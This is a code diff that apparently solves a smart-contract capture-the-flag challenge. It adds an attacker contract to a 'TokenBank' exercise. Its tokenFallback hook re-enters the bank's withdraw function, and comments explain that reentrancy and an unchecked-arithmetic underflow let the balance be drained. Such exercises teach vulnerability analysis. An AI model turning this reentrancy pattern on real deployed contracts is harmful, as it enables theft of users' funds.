@@ -1,6 +1,5 @@
 // SPDX-License-Identifier: UNLICENSED
 pragma solidity ^0.8.13;
-
 interface ITokenReceiver {
     function tokenFallback(
         address from,
@@ -132,9 +131,32 @@ contract TokenBankChallenge {
 // Write your exploit contract below
 contract TokenBankAttacker {
     TokenBankChallenge public challenge;
+    address public token;
 
     constructor(address challengeAddress) {
         challenge = TokenBankChallenge(challengeAddress);
+        token = address(challenge.token());
     }
     // Write your exploit functions here
+    function tokenFallback(
+        address from,
+        uint256 value,
+        bytes memory data
+    ) public {
+        // token hook allows reentrancy on mint since it calls transfer which call the receivers tokenFallback
+        // withdraw function's balanceOf state update is unchecked arithmetic which allows it to underflow into a negative numer
+        // since its uint256 it will wrap around to the max value
+        // this underflow is critical since it allows the transaction to complete without panic reverting
+        uint256 bank_balance = SimpleERC223Token(token).balanceOf(address(challenge));
+        if (bank_balance > 0) {
+            challenge.withdraw(bank_balance);
+        } else {
+            return;
+        }
+    }
+    function reenter() public {
+        //SimpleERC223Token(token).transferFrom(msg.sender, address(this), 500000 ether);
+        SimpleERC223Token(token).transfer(address(challenge), 500000 ether);
+        challenge.withdraw(500000 ether);
+    }
 }
